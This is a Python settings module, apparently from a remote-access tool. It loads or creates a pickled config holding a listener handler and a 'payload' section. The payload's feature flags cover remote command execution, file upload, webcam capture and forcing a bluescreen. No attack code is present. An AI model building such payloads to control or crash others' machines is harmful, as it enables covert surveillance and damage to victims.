import os
import pickle
import main
def load_config_for_main_py(key):
    try:
        value = main.get_value(key)
        return value
    except:
        return None
def config_load():
    main.config_load_init()
    if os.path.exists("./config/config.pkl"):
        # 提取信息
        # main.print_normal("settings>[*]loading config......")
        with open('./config/config.pkl', 'rb') as conf:
            config = pickle.load(conf)
            handler_conf = config['handler']
            payload_conf = config['payload']
            main.set_config('handler', handler_conf)
            main.set_config('payload', payload_conf)
    else:
        #初始化
        # if not os.path.exists('./config'):
        #     os.mkdir('./config')
        main.print_normal("settings>[*]Initializing......")
        init = {
            "handler" : {
                'listen_Default_ip' : "127.0.0.1",
                'listen_Default_port' : "624",
                'Autocommand' : ''
            },
            "payload" : {
                'Default_ip' : "127.0.0.1",
                'Default_port' : "624",
                'usage' : {
                'cmd' : True,
                'upload' : True,
                'cam_shot' : False,
                'priv_vbp_listen' : True,
                'bluescreen' : True
                }
            }
        }
        try:
            with open("./config/config.pkl", "wb") as fc:
                pickle.dump(init, fc)
        except IOError as e:
            main.print_error(f"settings>[-]Something Wrong when initializing, print out: {e}")
        else:
            main.print_good("settings>[+]Initializing done, loading the settings")
            config_load()